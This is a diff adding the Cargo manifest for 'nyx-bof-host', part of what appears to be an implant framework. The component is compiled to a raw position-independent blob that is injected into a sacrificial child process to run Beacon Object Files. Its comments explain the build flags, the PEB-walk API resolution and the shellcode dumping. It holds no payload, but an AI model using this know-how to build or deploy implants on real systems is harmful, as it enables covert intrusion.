@@ -1,0 +1,81 @@
+# Cargo manifest for nyx-bof-host — the B3 BOF sacrificial-process host,
+# compiled to a raw PIC binary (bof-host.bin) that the implant embeds via
+# include_bytes! and section-delivers into a sacrificial child process.
+#
+# This crate is **standalone** (NOT a workspace member — own [workspace]
+# below, same pattern as nyx-implant-core/tasks): it is built with nightly +
+# the Windows mingw target + `-Zbuild-std`, so the macOS dev-host stable
+# `cargo build --workspace` stays green.
+#
+# Build + regenerate `bof-host.bin`:
+#
+#   ./regen.sh   # (builds the DLL below, then runs the dumper member)
+#
+# Manual equivalent:
+#
+#   RUSTFLAGS="-Cpanic=abort \
+#     -Clink-arg=-nostdlib -Clink-arg=-Wl,-e,nyx_bof_host_entry \
+#     -Clink-arg=-Wl,--gc-sections" \
+#     cargo +nightly build --release \
+#       --manifest-path crates/bof-host/Cargo.toml \
+#       --target x86_64-pc-windows-gnu \
+#       -Zbuild-std=core,compiler_builtins,alloc \
+#       -Zbuild-std-features=compiler-builtins-mem
+#   cargo run --release --manifest-path crates/bof-host/Cargo.toml \
+#     -p nyx-bof-host-dumper -- \
+#     target/x86_64-pc-windows-gnu/release/nyx_bof_host.dll bof-host.bin
+#
+# Why the flags (mirrors crates/nyx-loader/pic-loader/Cargo.toml):
+#   * `-Clink-arg=-nostdlib`: no mingw CRT (dllcrt2/msvcrt). Without it,
+#     `memcpy` resolves to an api-ms-win-crt IAT thunk and the blob's calls
+#     would jump into an import table the raw blob doesn't have.
+#   * `-Wl,-e,nyx_bof_host_entry`: make our function the PE entry so LTO's
+#     dead-stripping roots on it and drops the CRT startup.
+#   * `-Wl,--gc-sections`: drop whatever LTO leaves unreferenced.
+#   * `-Zbuild-std=…,alloc`: the BOF execution core uses Vec/String (COFF
+#     parser + section bookkeeping) — alloc comes from build-std, backed by
+#     the stateless process-heap allocator in src/minialloc.rs.
+#   * `-Zbuild-std-features=compiler-builtins-mem`: memcpy/memset/memcmp come
+#     from compiler_builtins (pure code) instead of a CRT import.
+#
+# The dumper member (host target) reuses the nyx-pic-dumper engine
+# (decoder/pe/relayout) via #[path] module includes and extracts the
+# reachable closure from the `nyx_bof_host_entry` export. It refuses to emit
+# a blob for any image with relocations, imports in the reachable set, or
+# writable data references — which is why this crate carries NO writable
+# statics (see src/lib.rs).
+
+[package]
+name = "nyx-bof-host"
+version = "0.1.0"
+edition = "2021"
+license = "Apache-2.0 OR MIT"
+publish = false
+description = "Nyx B3 BOF sacrificial-process host — compiled to a raw PIC binary that runs a COFF/BOF in a child process, output over an inherited stdout pipe."
+
+# Standalone (NOT in the root workspace), same pattern as the pic-loader.
+[workspace]
+members = ["dumper"]
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+# Core layer: PEB-walk API resolution (resolve) + alloc glue (heap). Both
+# modules are allocation-light and carry no writable statics on the paths
+# this crate reaches (ntalloc/syscalls/config et al. are linked but never
+# reachable from the entry, so the dumper prunes them).
+nyx-implant-core = { path = "../implant-core" }
+# COFF/BOF loader core (no_std-compatible): parse + AMD64 relocations.
+nyx-coff = { path = "../coff" }
+
+[profile.dev]
+panic = "abort"
+opt-level = "z"
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
